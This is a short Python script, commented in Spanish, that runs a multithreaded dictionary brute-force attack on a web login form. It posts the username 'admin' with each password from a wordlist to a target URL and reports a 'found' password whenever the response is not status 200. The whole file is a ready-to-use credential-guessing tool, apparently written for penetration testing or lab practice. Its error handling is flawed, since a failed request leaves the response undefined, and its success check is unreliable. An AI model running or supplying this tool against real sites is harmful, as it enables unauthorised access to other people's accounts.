import requests, argparse, os, threading
from concurrent.futures import ThreadPoolExecutor

found_event = threading.Event()
print_lock = threading.Lock()

def brute_force(url, password):

    if found_event.is_set():
        return
    
    data = {
        'user':'admin',
        'pass':password
    }

    try:
        r = requests.post(url=url, data=data, allow_redirects=False)  # Para usar proxy añadir proxies={'http':'http://127.0.0.1:8080'}
    except requests.exceptions.HTTPError as err:
        print('[-] Ha ocurrido un error en la conexion')
    except requests.exceptions.InvalidSchema as err:
        print('[-] El esquema HTTP esta mal especificado (http:// o https://)')
    except requests.exceptions.ProxyError as err:
        print('[-] Ha ocurrido un error con el Proxy, asegurate de tenerlo activo.')

    if found_event.is_set():
        return

    with print_lock:
        # print(f'[INFO] Probando credenciales: admin:{password}')    Descomentar para verificar las cerdenciales que se van probando

        if r.status_code != 200:
            found_event.set()
            print(f'\n\n\033[1;32m[+] CLAVE ENCONTRADA!: admin:{password}\033[0m\n')
            return


def main(url, wordlist, workers):
    check_url = lambda url: url if url[-1] == '/' else url + '/'
    url = check_url(url)

    if not os.path.exists(wordlist):
        print(f'\033[1;31m[-] El diccionario {wordlist} no se encuentra.\033[0m')
        return False

    print(f'[INFO] Comenzando el ataque de fuerza bruta sobre "{url}"...')
    with open(wordlist, 'r', encoding='latin-1') as p:
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for line in p:
                if found_event.is_set(): break
                password = line.strip()
                executor.submit(brute_force, url, password)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Fuerza bruta para login web')

    parser.add_argument('-t', '--target', required=True,
                        help='URL a atacar')
    parser.add_argument('-w', '--wordlist', required=True,
                        help='Wordlist a usar')
    parser.add_argument('-wk', '--workers', type=int, default=5,
                        help='Numero de hilos, por defecto 5')
    
    args = parser.parse_args()

    try:
        main(args.target,
             args.wordlist,
             args.workers)
    except KeyboardInterrupt:
        with print_lock:
            print('[INFO] Deteniendo ataque de fuerza bruta...')
            os._exit(0)
